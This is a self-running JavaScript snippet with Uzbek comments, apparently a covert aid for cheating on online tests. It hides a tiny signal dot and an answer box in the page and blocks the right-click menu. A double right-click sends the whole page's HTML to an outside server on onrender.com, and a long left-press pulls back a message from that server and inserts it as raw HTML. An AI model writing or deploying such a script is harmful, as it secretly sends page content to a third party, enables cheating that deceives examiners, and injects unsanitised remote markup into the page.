(function(){
    const S = 'https://f1-f2mq.onrender.com';
    
    // 1. Maxfiy indikator (Signal beruvchi nuqta)
    let ind = document.createElement('div');
    ind.style = "position:fixed; bottom:2px; right:2px; width:4px; height:4px; border-radius:50%; z-index:999999; pointer-events:none; display:none;";
    document.body.appendChild(ind);

    function showSignal(color, time) {
        ind.style.background = color;
        ind.style.display = 'block';
        setTimeout(() => { ind.style.display = 'none'; }, time);
    }

    // Ulandi signali (Yashil nuqta, 0.5 soniya)
    showSignal('#00ff00', 500);

    // 2. Javob qutichasi
    let box = document.createElement('div');
    box.style = "position:fixed; bottom:10px; left:10px; background:rgba(0,0,0,0.95); color:white; padding:12px; z-index:999999; display:none; border-radius:5px; font-family:sans-serif; font-size:13px; border:1px solid #333; max-width:220px; pointer-events:none;";
    document.body.appendChild(box);

    // 3. Savol yuborish: O'ng tugmani 2 marta tez bosish
    let lastRightClick = 0;
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        let now = Date.now();
        if (now - lastRightClick < 400) {
            fetch(S + '/upload-html', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ html: document.documentElement.outerHTML })
            });
            // Savol ketganini bildiruvchi kichik kulrang nuqta
            showSignal('#555', 1000);
        }
        lastRightClick = now;
        box.style.display = 'none'; // O'ng tugma bosilganda javob o'chadi
    });

    // 4. Javobni chiqarish: Chap tugma 3 soniya
    let t;
    document.addEventListener('mousedown', (e) => {
        if (e.button === 0) {
            t = setTimeout(async () => {
                const r = await fetch(S + '/latest');
                const d = await r.json();
                box.innerHTML = d.message;
                box.style.display = 'block';
            }, 3000);
        }
    });
    document.addEventListener('mouseup', () => clearTimeout(t));
})();
